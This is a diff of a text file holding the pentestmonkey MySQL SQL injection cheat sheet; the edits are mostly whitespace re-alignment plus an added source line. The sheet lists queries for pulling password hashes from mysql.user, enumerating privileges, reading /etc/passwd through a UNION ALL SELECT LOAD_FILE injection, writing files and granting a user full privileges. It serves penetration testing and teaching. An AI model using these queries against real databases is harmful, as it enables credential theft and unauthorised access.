@@ -1,14 +1,17 @@
-Version					SELECT @@version
+Source: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 
-Comments				SELECT 1; #comment
-						SELECT /*comment*/1;
+Version				SELECT @@version
+
+Comments			SELECT 1; #comment
+				SELECT /*comment*/1;
 				
 Current User			SELECT user();
-						SELECT system_user();
+				SELECT system_user();
 						
-List Users				SELECT user FROM mysql.user; — priv
+List Users			SELECT user FROM mysql.user; — priv
 
-List Password Hashes	SELECT host, user, password FROM mysql.user; — priv
+List Password Hashes		SELECT host, user, password FROM mysql.user; — priv
+
 Password Cracker		John the Ripper will crack MySQL password hashes.
 
 List Privileges			SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns
@@ -20,9 +23,9 @@ Current Database		SELECT database()
 List Databases			SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
 						SELECT distinct(db) FROM mysql.db — priv
 						
-List Columns			SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+List Columns			SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema !=‘information_schema’
 
-List Tables				SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
+List Tables			SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
 
 Find Tables From Column Name	SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
 
@@ -30,17 +33,18 @@ Select Nth Row			SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # ro
 						SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
 						
 Select Nth Char			SELECT substr(‘abcd’, 3, 1); # returns c
-Bitwise					AND	SELECT 6 & 2; # returns 2
-						SELECT 6 & 1; # returns 0
+
+Bitwise				AND	SELECT 6 & 2; # returns 2
+				SELECT 6 & 1; # returns 0
 						
 ASCII Value -> Char		SELECT char(65); # returns A
 
 Char -> ASCII Value		SELECT ascii(‘A’); # returns 65
 
-Casting					SELECT cast(‘1’ AS unsigned integer);
-						SELECT cast(‘123’ AS char);
+Casting				SELECT cast(‘1’ AS unsigned integer);
+				SELECT cast(‘123’ AS char);
 						
-String Concatenation	SELECT CONCAT(‘A’,’B’); #returns AB
+String Concatenation		SELECT CONCAT(‘A’,’B’); #returns AB
 						SELECT CONCAT(‘A’,’B’,’C’); # returns ABC
 						
 If Statement			SELECT if(1=1,’foo’,’bar’); — returns ‘foo’
@@ -59,7 +63,7 @@ Command Execution		If mysqld (<5.0) is running as root AND you compromise a DBA 
 Local File Access		…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.
 						SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system
 						
-Hostname, IP Address	SELECT @@hostname;
+Hostname, IP Address		SELECT @@hostname;
 
 Create Users			CREATE USER test1 IDENTIFIED BY ‘pass1’; — priv
 
@@ -67,10 +71,10 @@ Delete Users			DROP USER test1; — priv
 
 Make User DBA			GRANT ALL PRIVILEGES ON *.* TO test1@’%’; — priv
 
-Location of DB files	SELECT @@datadir;
+Location of DB files		SELECT @@datadir;
 
 Default/System Databases	information_schema (>= mysql 5.0)
-							mysql
+				mysql
 
 Some examples:
 
